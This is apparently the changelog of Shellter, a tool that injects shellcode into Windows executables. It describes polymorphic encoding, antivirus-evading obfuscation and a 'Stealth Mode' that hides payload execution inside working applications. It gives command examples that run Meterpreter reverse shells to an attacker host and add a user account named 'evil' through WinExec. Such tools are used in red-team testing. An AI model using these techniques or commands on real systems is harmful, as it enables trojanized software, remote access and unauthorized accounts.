[+] Other minor updates/optimizations.




Shellter v1.7
...............

Released 06d/08m/2014

[+] Minor updates/optimizations.




Shellter v1.7 Wine Beta #1
............................

Released 12d/08m/2014

[+] Native Windows & Wine/CrossOver Compatible.

[+] Optimized tracer. 
    Up to 3 times faster when tracing over code that makes frequent
    calls to functions outside the PE image. Testing has been applied
    using this build vs the Windows-Only build by tracing the same PE
    target for a relatively big number of instructions.

[+] Removed tracing option: 'Start Trace from EntryPoint/System DLL'.
    This option was mostly for testing and it will probably be replaced
    with another.
    This option is still available in the Windows-Only compatible build.

Known issues: In some cases, the tracer might return RMEM_ERROR_02 and stop
              tracing.You can still use the traced execution flow up to that
              point and proceed with the injection stage.
              I am currently trying different approaches to solve issues that
              might influence the tracing stage, even though these are quite
	      rare. These issues don't apply in the Windows-Only compatible
              build.




Shellter v1.8
...............

Released 01d/11m/2014

[+] Merged Native Windows & Windows/Wine Tracing Engines.

[+] Added command line support for the Basic Mode.
    Start Shellter using '--h' argument to get more information regarding 
    the supported arguments.

[+] Added option to choose Tracing Engine. Only applies under Native Windows.*

[+] Removed tracing option: 'Start Trace from EntryPoint/System DLL'.

Knows issues: See notes in the previous update regarding the Windows/Wine
              tracing engine. These issues don't apply when choosing the
              Native Windows tracing engine.

*Note: When running under Wine, the Tracing Engine is selected automatically.




Shellter v1.9
...............

Released 22d/11m/2014

[+] Automated usage of encoded-payload handlers in Basic Mode.
    Even when operating under Basic Mode, Shellter will take
    advantage of this feature that was only available from
    Advanced Mode so far.
    Shellter will only change section's permissions if the PE
    target doesn't support any of the available methods, or if
    the user changes this setting from the cmdline.
    


[+] Enhanced cmdline support.
    Allows the user to customise Basic Mode operation and make
    use of some features and options that were previously only
    available in Advanced Mode.

*Note: When using the Basic Mode with cmdline flags, if an
       encoded payload is specified then the user needs to set
       both the '--enc' flag as well as the '--handler'.
       Start Shellter using '--h' to see how to use the cmdline
       options.

[+] Fixed a potential read-out-of-bounds issue in the cmdline
    parser.

[+] Minor UI and internal optimizations.




Shellter v2.0
...............

Released 16d/12m/2014

[+] Added user notification about the minimum required Win
    OS version for the target PE.
    This allows the user to avoid situations where he makes
    use of an application that will not run properly in the
    victim host in case there is an earlier version of
    Windows.

[+] Enhanced UI with more user-friendly output.

[+] Cmdline updates.
    Changed help menu switch to '-h' and '--help', and verbose
    mode to '-v'.

[+] Completely removed manual tracing engine selection.
    Shellter will pick up the appropriate one depending on 
    whether you run it in a native Windows host or in Wine.
    This means that the user is no longer allowed to select
    the Wine compatible engine when running Shellter in a
    native Windows host.

[+] All-threads tracing option is not shown as 'Beta' feature.

[+] Various optimizations in both tracing engines.

[+] Updated Wine/Crossover compatible tracing engine.
    Solved compatibility issues with some applications, and
    some known issues that were mentioned in the previous
    updates.

[+] Fixed a shared access violation issue that occurred sometimes
    when updating the CheckSum field in the PE header.
    This issue didn't affect the rest of the injection process.

[+] Added an icon in the executable.




Shellter v2.1
...............

Released 01d/02m/2015

[+] Fixed a couple of potentially bug causing issues.

[+] Added several extra checks to enhance error handling during
    injection stage.

[+] Displays the name of the PE section where the shellcode was 
    injected.

[+] Minor updates/optimizations.




Shellter v2.2
...............

Released 07d/02m/2015

[+] Automatic Backup of the original PE file.

[+] Minor changes in error-display notifications.




Shellter v3.0
...............

Released 18d/05m/2015

[+] Polymorphic IAT type handlers for encoded payloads.
    This is a major upgrade which dramatically enhances
    polymorphism in the final output. This feature breaks
    down the stubs of those handlers and binds them with
    thread context aware polymorphic code.

[+] Introduced Auto/Manual mode selection.
    This was a necessary change since the originally called 
    'Basic' mode was far from basic for some time now.
    So Basic/Advanced mode selection has been dropped.

[+] Introduced injection verification stage.
    After successful injection, Shellter will verify that the
    first instruction of the injected code will be reached
    successfully.
    If polymorphic code has been added, then the first instruction
    refers to that and not to the effective payload. 	

[+] Introduced '--polyIAT' switch and the option to obfuscate
    the chosen IAT type handler in 'Auto' and 'Manual' modes
    respectively.
    They both take advantage of the same feature.

*Note: When using Auto mode without cmdline arguments, this
       feature is enabled by default. 
       If cmdline arguments are used, the aforementioned
       switch has to be set to enable this feature.

[+] When using Shellter with Wine, the associated operation
    mode is not shown as 'Beta' anymore.
      
[+] Several optimizations in adjusting IAT type handlers.

[+] Several internal design optimizations.

[+] Some minor changes/updates/optimizations.




Shellter v3.1
...............

Released 30d/05m/2015

[+] Automatic adjustment of the console fonts when running Shellter
    in Windows >= Vista. Applies also in Wine with the appropriate
    settings.
	
[+] Shellter console is now automatically positioned at the centre
    of the main monitor.

	
[+] Fixed a typo in IAT handler obfuscation stage: T.C.A was showing
    as C.T.A.

[+] Displays the amount of time elapsed during IAT handler obfuscation.




Shellter v4.0
...............

Released 05d/07m/2015

[+] Custom Proprietary Encoder.
    This a major upgrade that facilitates direct usage of non-encoded
    payloads generated by metasploit, or created by the user.
    Shellter will apply its own random dynamic encoding layer and will
    generate every time a new decoder based on that.
    Cmdline switch: --encode
	
[+] Polymorphic Decoder.
    Shellter can apply an extra layer of obfuscation over the generated
    decoder by using thread context aware polymorphic code.
    Cmdline switch: --polydecoder

[+] Dynamic Thread Context Keys.
    Another major upgrade and unique feature of Shellter. This feature
    automates the usage of dynamic thread context information of the
    original execution flow of the application as encoding keys.
    Cmdline switch: --DTCK
	
[+] Reflective DLL loaders support.
    Another major upgrade feature which allows the user not just to
    use raw shellcode, but even an entire DLL file that contains a
    a reflective loader function.
    The user can even choose to encode the entire DLL by using Shellter's
    proprietary encoder as mentioned above.
    Feature suggested by: Tom Wilson
    Cmdline switch: --reflective <FuncName>
	
[+] Embedded Payloads.
    This new feature, allows the user to make use of some commonly used
    payloads without the need to generate them through metasploit.
    The user can choose to apply Shellter's encoder as mentioned above.
    It is always recommended to use encoded payloads. If a payload is
    not encoded, like those embedded in Shellter, then encode it through
    Shellter by using the --encode cmdline switch.
	
    Payloads List
    -------------
    [1] meterpreter_reverse_tcp
    [2] meterpreter_reverse_http
    [3] meterpreter_reverse_https
    [4] meterpreter_bind_tcp
    [5] shell_reverse_tcp
    [6] shell_bind_tcp
    [7] WinExec
	
    Examples: -p meterpreter_reverse_tcp --port 5656 --ip 192.168.0.6
	          -p winexec --cmd calc.exe
	
[+] Enhanced injection selection point.
    This feature enhances the randomization regarding the injection point
    when using Shellter in Auto mode.
	
[+] Extra cmdline switches.

    --list: Shows a list of the embedded payloads.

    --encode: Apply Shellter's encoder over the payload.
	
    --polydecoder: Obfuscate the generated decoder by using thread context
	               aware polymorphic code.

    --DTCK: Experimental feature that uses dynamic thread context information
            from the original execution flow of the target PE as keys for 
            payload encoding.
				   
    --reflective <FuncName>: Marks the submitted payload as a DLL and defines
	                     the function name of the reflective loader.
	
    --ip: Specifies the IPv4 address used by the reverse connection payloads.
	
    --port: Specifies the port number used by the reverse and bind connection
            payloads.
			
    --cmd: Specifies the cmdline argument for the WinExec payload.

[+] All threads tracing is now enabled by default even when cmdline is used.
    Specifying '--trace all' is now obsolete. However, the user can choose
    to only trace the main thread by specifying '--trace main' in the cmdline.
    However, this is not recommended.
	
[+] Increased console buffer when using Shellter under Wine. The user can now
    scroll up the console output and review the available information.

[+] Fixed a bug that occasionally caused wrong adjustment of some injected
    random Call instructions during IAT handler obfuscation. This bug was
    eventually triggered with calc.exe and notepad.exe only when the
    aforementioned feature was used, so it took some time to realize its
    existence.

[+] Various optimizations, changes, and bug fixes.




Shellter V
............

Released 08d/08m/2015

[+] Stealth Mode.
    This is a major upgrade that combines dynamic PE infection with a RedTeam
    functionality. This means that while you are not losing any of the unique
    benefits of the dynamic PE infection that Shellter provides, you can also
    preserve the original functionality of the infected application.
    This means, that the application will run as it should, while the execution
    of the payload is completely transparent to the user.
    When you enable this feature, Shellter automatically enables its own encoder
    and IAT type handling. In a few words, when Stealth Mode is enabled the --enc,
    --encode, and handler --IAT flags are automatically set. So you don't have to
    specify them yourself.
	
   Example: shellter -f <target.exe> -p <payload.bin> --stealth --polydecoder
	    --polyiat --junk
			 
   Example: shellter -f <target.exe> -p meterpreter_reverse_tcp --port 4545
	    --ip 192.168.0.6 --stealth --polyIAT --polyDecoder --junk

   Important: Take a look at the documentation of this feature in readme.txt,
              before using it.
	
[+] Dynamic Injection of Multiple Payloads.
    Thanks to the combination of the Stealth Mode with the dynamic PE infection
    that Shellter provides, you can infect multiple times the same PE file using
    different payloads as long as you always enable the Stealth Mode feature.

    For example, you can inject a "meterpreter_reverse_tcp" stager and then
    infect again the same PE file with an "Add User" payload, and so on.
    Every layer of infection will be using a unique dynamic approach with a
    different encoding, a randomly picked up IAT handler, and extra obfuscation
    if you choose to apply this by using the --polyDecoder and --polyIAT
    switches. In addition, you can use the --junk switch to add some extra junk
    polymorphic code.
	
[+] Added -s / --stealth command line switches to enable Stealth Mode when
    using Shellter from the command line.
	
[+] Added option to enable Stealth Mode feature from the Manual Mode, and from
    the Auto Mode when command line arguments have not been used.

[+] Deletes dropped Disasm.dll when Shellter terminates normally.

[+] Various updates, fixes, optimizations.




Shellter V [5.1]
..................

Released 12d/08m/2015

[+] Fixed a shared-access-violation issue during injection stage, which was
    occasionally caused by a Close/Open file handle race condition when Stealth
    Mode was enabled.
	
[+] Fixed an issue with the embedded WinExec payload which would cause the
    process of the infected PE file to be terminated after the execution of the
    payload had finished, even though Stealth Mode was used.

[+] Default time tracing in Auto Mode is 30 seconds when using Shellter inside
    native Windows hosts and 60 seconds when using Shellter in Wine. I decided
    to increase the tracing time in the second case because the whole tracing
    process is much slower in Wine. In this way we manage to compensate against
    the slower tracing speed that is inevitable when we use Shellter in Wine.

[+] Minor changes, fixes, optimizations.




Shellter V [5.2]
..................

Released 11d/10m/2015

[+] Added domain names support for the embedded Meterpreter_Reverse_HTTP/HTTPS
    payloads.
    Note: You can always use domain names even with payloads not embedded in
          Shellter. You just need to generate the payload in raw format so that
          you can feed it to Shellter as a file. This was always supported.

[+] Introduced the --lhost switch for specifying the attacker's server by IP or
    domain name.
	
[+] The --ip switch has been dropped (see above).

[+] Introduced --examples switch to show usage examples which were previously
    shown in the help menu.

[+] Enhanced command line parser.
    Added some extra checks over the supported arguments. Shellter will notify
    the user in case a switch/option specified is either not supported or
    potentially not used correctly.

[+] Fixed a design issue that wouldn't allow the user to choose one of the
    embedded payloads if the name was mistyped in the command line. In that
    case Shellter would only accept a payload from a file. This has now been
    fixed so that if the user mistyped either the name of the embedded payload
    or the name of the file containing the payload data; Shellter will always
    give the option to choose again between a listed or a custom one.

[+] Fixed a potential usage of an unitialized pointer while reading the payload
    data from a file when specific settings were enabled.

[+] A few updates/corrections in the documentation (readme.txt) file.
	
[+] Various internal updates and optimizations.




Shellter V [5.3]
..................

Released 24d/10m/2015

[+] Enhanced 'Junk' and 'Thread Context Aware' Polymorphic code generation
    engines. More instructions are now supported for a more randomized
    output.

[+] Ultra fast polymorphic code generation.

[+] Tracing Engine modifications.
    Up to version 5.2 Shellter would keep tracing the main thread even if more
    than one threads were created while the user had chosen to trace only the
    main one. This could potentially cause some issues, since during execution
    flow filtering Shellter would be not aware of what and where was executed
    in another thread.
    From version 5.3 if the user chooses to only trace the main thread, or log
    dynamic thread context information to use dynamic thread context keys, then
    once a new thread is created Shellter will exit the tracing stage in order
    to be able to provide more reliable results during the execution flow
    filtering.
    In Auto Mode All-Threads-Tracing is enabled by default, but if command line
    is used, then it can be disabled using the '--trace main' switch.
    In Manual Mode, Shellter will ask the user to choose between the two.

[+] Fixed a design error that was introduced by a recent update which would
    allow a user to specify an empty 'CMD' command string when the embedded
    WinExec payload was used.

[+] Various internal updates and optimizations.




Shellter V [5.4]
..................

Released 31d/10m/2015

[+] User Defined Encoding Sequence.
    This feature allows the user to optionally choose a personalised encoding
    scheme based on the supported encoding operators.
    In Manual Mode, Shellter will ask the user to enable this feature or not.
    In Auto mode, this feature is only available through the command line by
    extending the --encode switch with the encoding sequence between '{}'.
    When the user specifies the encoding sequence in Manual mode, then the
    '{}' characters must not be entered.
    
    Auto mode - Command line Example: --encode {!^+}
   
    Manual mode - Enter Encoding Sequence: !^+

    When Auto mode is used through the command line, if the user only sets the
    --encode switch without specifying an encoding scheme, Shellter will build
    its own random encoding sequence as it was done until now.
    Note: Before using this feature, it is recommended that you read about it
          in the documentation regarding Shellter's proprietary encoder.
          This feature should only be used by advanced users.

[+] Help menu updates.

[+] A few updates/corrections in the documentation (readme.txt) file.

[+] Updated usage examples with proper explanation on the given command line.
    Run shellter with the --examples switch to display them.

[+] Various internal updates and optimizations.

    


Shellter V [5.5]
..................

Released 31d/10m/2015

[+] Fixed an error in the user-defined-encoded-sequence parser that would make
    Shellter recognize valid sequences as invalid, thus making this feature
    unusable from Manual mode.

    Reported by: @fancy__04

[+] Updated the XOR encoding operator from '^' to 'x'.
    The original operator was fine when testing this new feature from visual 
    studio, but apparently using the '^' character in Windows command prompt
    is really a bad idea. I totally forgot about this since, Visual Studio
    uses the command line as a parameter to CreateProcess(), which in that
    case there is no issue. The impact was that the XOR operations were
    eliminated from the supplied encoding sequence when using the command
    line.

    Example using the new XOR operator: --encode {!x-x+}

[+] Applied all relevant documention updates.




Shellter V [5.6]
..................

Released 07d/11m/2015

[+] Added an extra verification check over the user-defined-encoding-sequence
    feature that checks for insecure concatenations of encoding operators.
    It aims to protect this feature from being used in a totally wrong way.
    However, it is still recommended that this feature should only be used by
    advanced users.

[+] Fixed an error in the user-defined-encoding-sequence buffer initialization
    which could cause later to ignore the user supplied sequence and trigger
    the random encoding scheme generation from Shellter. In that case the
    payload would be encoded, but without using the encoding scheme that was
    defined by the user.

[+] Decreased the maximum of extra delay that is applied before the execution
    of the payload, when Stealth mode is not enabled.

[+] Several internal optimizations.




Shellter V [5.7]
..................

Released 14d/11m/2015

[+] Enhanced thread-context-aware polymorphic code engine.
    More instructions supported with even more randomized
    output.

[+] Optimized CTRL event listener.
    In tracing mode, the user can still interrupt that stage and proceed with
    the rest of the injection process by pressing CTRL+C, but after this stage
    Shellter disables processing CTRL+C as a signal in order to protect itself
    from being accidentally terminated during the injection stages. In case
    an error occurs, or at successful completion of injection, processing of
    CTRL+C is re-enabled.

[+] Automatic deletion of the dropped Disasm.dll module even when Shellter is
    terminated by closing the console window. If multiple instances of Shellter
    are running, then the aforementioned module will be deleted once the last
    instance of Shellter is terminated.
    Note: This doesn't apply in case Shellter is terminated by another process,
          such as the task manager.

[+] Added a user reminder at the PE file backup stage. 
    Always remember that the .bak file is the previous state of what you are
    going to generate.
    In other words, the first time you infect a PE file, the .bak file is the
    clean PE file. If you decide to add another payload to that PE file, then
    the new .bak file is the PE file already infected with one payload.

[+] Updated section 8 of the current documentation (readme.txt) file.

[+] Various internal updates and optimizations.




Shellter V [5.8]
..................

Released 22d/11m/2015

[+] Command line parser modifications.
    A few changes have been made in the command line parser to ensure that certain
    arguments are passed in a specific order. This modification will later serve
    one of the new features of the upcoming advanced edition of Shellter.
    In particular, when specifying one of the embedded payloads, then the options
    for that payload (--lhost, --port, --cmd) must now follow immediately after.
    
    Examples: -p meterpreter_reverse_tcp --lhost 192.168.0.9 --port 3465
              -p meterpreter_bind_tcp --port 4565
              -p winexec --cmd "cmd.exe /c net user evil password /ADD"

[+] Shellter will now exit automatically when command line arguments have been used,
    in order to facilitate it's usage through scripting.

[+] When '-h/--help' and '--examples' command line arguments are used, Shellter will
    now print all the output at once, so that the user can easily save it into a file
    and read it from there.

[+] List of usage examples has been updated.
    Run Shellter using --examples argument to display them.

[+] Minor updates/corrections in the documentation and in the help menu.
    Run Shellter using -h/--help arguments to display the list of supported arguments
    with further explanation.

[+] Various internal updates and optimizations.
